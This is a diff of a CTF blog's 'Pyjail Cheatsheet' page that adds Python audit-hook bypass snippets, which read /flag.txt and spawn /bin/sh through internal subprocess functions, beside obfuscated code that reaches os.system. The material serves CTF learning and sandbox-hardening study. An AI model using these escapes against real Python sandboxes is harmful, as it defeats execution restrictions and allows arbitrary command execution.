@@ -24,16 +24,16 @@
     <meta name="twitter:card" content="Shirajuki - A CTF player from Norway, @iku-toppene, @bootplug, @corax and @rumbleinthejungle" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheat Sheet</title><meta property="og:title" content="Pyjail Cheat Sheet" data-svelte="svelte-15w3rt">
+    <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheatsheet</title><meta property="og:title" content="Pyjail Cheatsheet" data-svelte="svelte-15w3rt">
 	<link href="/_app/immutable/assets/__layout-51aa36ef.css" rel="stylesheet">
 	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
-	<link rel="modulepreload" href="/_app/immutable/start-2e56a49b.js">
+	<link rel="modulepreload" href="/_app/immutable/start-6f31901e.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
 	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
-	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-05e1b478.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-d91c2a20.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
   </head>
@@ -54,10 +54,10 @@
 
 <main class="svelte-10fak7s">
 
-<section class="content"><div><h1>Pyjail Cheat Sheet</h1>
+<section class="content"><div><h1>Pyjail Cheatsheet</h1>
 
   <p><b>Date:</b>
-    June 26, 2024</p>
+    July 22, 2024</p>
 
   <p><b>Category:</b>
     <span><a href="/blog/category/cheatsheet">cheatsheet</a></span></p>
@@ -196,6 +196,29 @@ _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_<span class="token punctuation">(</span>𝘪𝘯
 obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 <span class="token punctuation">[</span>d<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_＿doc＿_<span class="token punctuation">,</span>o<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span>h<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>s<span class="token operator">+</span>h<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_＿<span class="token keyword">class</span>＿_<span class="token punctuation">.</span>_＿getitem＿_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>o<span class="token operator">+</span>s<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_＿<span class="token keyword">class</span>＿_<span class="token punctuation">.</span>_＿getitem＿_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_＿<span class="token keyword">class</span>＿_<span class="token punctuation">.</span>_＿pos＿_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_＿<span class="token keyword">class</span>＿_<span class="token punctuation">.</span>_＿mro＿_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_＿subclasses＿_<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code><!-- HTML_TAG_END --></pre>
+<h3 id="audithook-bypass"><a href="#audithook-bypass">audithook bypass</a></h3>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token keyword">import</span> sys<span class="token punctuation">,</span> os
+sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token keyword">lambda</span> <span class="token operator">*</span><span class="token keyword">_</span><span class="token punctuation">:</span> x<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>_exit<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840</span></code><!-- HTML_TAG_END --></pre>
+<pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5</span>
+<span class="token comment"># https://github.com/python/cpython/issues/115322</span>
+<span class="token keyword">import</span> readline
+readline<span class="token punctuation">.</span>read_history_file<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>readline<span class="token punctuation">.</span>get_history_item<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">import</span> _posixsubprocess <span class="token comment"># python 3.10, may differ in other versions</span>
+errpipe_read<span class="token punctuation">,</span> errpipe_write <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
+_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> errpipe_read<span class="token punctuation">,</span> errpipe_write<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+
+<span class="token keyword">import</span> subprocess <span class="token comment"># python 3.10, may differ in other versions</span>
+errpipe_read<span class="token punctuation">,</span> errpipe_write <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
+subprocess<span class="token punctuation">.</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> errpipe_read<span class="token punctuation">,</span> errpipe_write<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+
+<span class="token keyword">import</span> multiprocessing<span class="token punctuation">.</span>util <span class="token comment"># underlying uses _posixsubprocess</span>
+multiprocessing<span class="token punctuation">.</span>util<span class="token punctuation">.</span>spawnv_passfds<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token comment"># More techniques at https://github.com/Nambers/python-audit_hook_head_finder</span>
+<span class="token comment"># + https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202024/calc</span></code><!-- HTML_TAG_END --></pre>
 <h3 id="assigning-attributes-and-variables"><a href="#assigning-attributes-and-variables">assigning attributes and variables</a></h3>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code><!-- HTML_TAG_END --></pre>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># walrus operator (>= python3.8)</span>
@@ -1422,13 +1445,13 @@ inp <span class="token operator">=</span> <span class="token builtin">input</spa
 </footer>
 
 
-		<script type="module" data-sveltekit-hydrate="1gdc4ub">
-		import { set_public_env, start } from "/_app/immutable/start-2e56a49b.js";
+		<script type="module" data-sveltekit-hydrate="ydw5yp">
+		import { set_public_env, start } from "/_app/immutable/start-6f31901e.js";
 
 		set_public_env({});
 
 		start({
-			target: document.querySelector('[data-sveltekit-hydrate="1gdc4ub"]').parentNode,
+			target: document.querySelector('[data-sveltekit-hydrate="ydw5yp"]').parentNode,
 			paths: {"base":"","assets":""},
 			session: {},
 			route: true,
